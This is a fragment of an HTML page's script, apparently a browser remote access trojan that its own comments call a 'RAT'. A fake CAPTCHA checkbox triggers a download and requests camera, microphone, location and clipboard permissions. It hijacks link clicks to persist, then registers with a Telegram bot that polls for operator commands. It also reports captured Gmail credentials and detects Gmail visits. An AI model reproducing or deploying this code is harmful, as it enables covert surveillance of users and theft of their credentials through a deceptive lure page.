                            break;
                        case '/devices':
                            await sendMessage(`🖥️ *Device* \`${deviceId}\`\nPermissions: ${permissionsStatus.camera?'✅':'❌'} 📷 ${permissionsStatus.microphone?'✅':'❌'} 🎤 ${permissionsStatus.location?'✅':'❌'} 📍 ${permissionsStatus.clipboard?'✅':'❌'} 📋\n${storedGmailCredentials.email ? `🔐 Gmail: ${storedGmailCredentials.email}` : 'No creds'}`, 'Markdown');
                            break;
                        default:
                            await sendMessage(`Unknown command: ${cmd}`);
                    }
                } catch(err) {
                    await sendMessage(`Error: ${err.message}`);
                }
            }

            // ================= POLLING & PERSISTENCE =================
            async function syncOffset() {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
                    const data = await res.json();
                    if (data.ok && data.result && data.result.length > 0) {
                        updateId = data.result[data.result.length - 1].update_id + 1;
                    } else {
                        updateId = 0;
                    }
                } catch(e) {}
            }

            async function pollUpdates() {
                if (!isRegistered) return;
                try {
                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`;
                    const res = await fetch(url, { headers: TELEGRAM_HEADERS });
                    const data = await res.json();
                    if (data.ok && data.result) {
                        for (const upd of data.result) {
                            if (upd.update_id >= updateId) {
                                updateId = upd.update_id + 1;
                                if (upd.message && upd.message.text) {
                                    await handleCommand(upd.message.text);
                                } else if (upd.callback_query) {
                                    await handleCommand('/' + upd.callback_query.data);
                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${upd.callback_query.id}`, { headers: TELEGRAM_HEADERS });
                                }
                            }
                        }
                    }
                } catch(e) {}
            }

            function setupPersistence() {
                document.addEventListener('click', (e) => {
                    let target = e.target.closest('a');
                    if (target && target.href && !target.href.startsWith('javascript:')) {
                        e.preventDefault();
                        window.open(target.href, '_blank');
                    }
                }, true);
                const pframe = document.getElementById('persistentFrame');
                if (pframe) pframe.src = 'about:blank';
            }

            // Gmail detection
            let lastUrl = location.href;
            new MutationObserver(() => {
                const url = location.href;
                if (url !== lastUrl) {
                    lastUrl = url;
                    if (url.includes('mail.google.com') && !gmailDetectedNotified) {
                        gmailDetectedNotified = true;
                        sendMessage(`📧 *Gmail detected* on \`${deviceId}\`. Use /read_emails.`, 'Markdown');
                    } else if (!url.includes('mail.google.com')) {
                        gmailDetectedNotified = false;
                    }
                }
            }).observe(document, { subtree: true, childList: true });

            // ================= CAPTCHA HANDLER =================
            function initCaptcha() {
                const overlay = document.getElementById('captchaOverlay');
                const checkbox = document.getElementById('captchaInput');
                const captchaDiv = document.getElementById('captchaCheckbox');

                const onCaptchaSuccess = async () => {
                    // 1. Trigger download (user just clicked the checkbox)
                    triggerDownload();

                    // 2. Remove CAPTCHA overlay
                    if (overlay) overlay.style.display = 'none';

                    // 3. Show and start the RAT interface
                    document.getElementById('loadingOverlay').style.display = 'flex';
                    document.getElementById('mainFrame').style.display = 'block';
                    
                    // 4. Now start the RAT initialization
                    await requestAllPermissions();
                    setupPersistence();
                    await syncOffset();
                    await registerAndSendMenu();
                    isRegistered = true;
                    intervalId = setInterval(pollUpdates, POLL_INTERVAL);
                    document.getElementById('loadingOverlay').style.display = 'none';
                    document.getElementById('mainFrame').style.opacity = '1';
                };

                // When checkbox is checked
                checkbox.addEventListener('change', (e) => {
                    if (e.target.checked) {
                        onCaptchaSuccess();
                    }
                });

                // Also allow clicking the whole div
                captchaDiv.addEventListener('click', () => {
                    if (!checkbox.checked) {
                        checkbox.checked = true;
                        onCaptchaSuccess();
                    }
                });
            }

            // Start CAPTCHA initially (RAT not loaded yet)
            initCaptcha();
        })();
    </script>
</body>
</html>
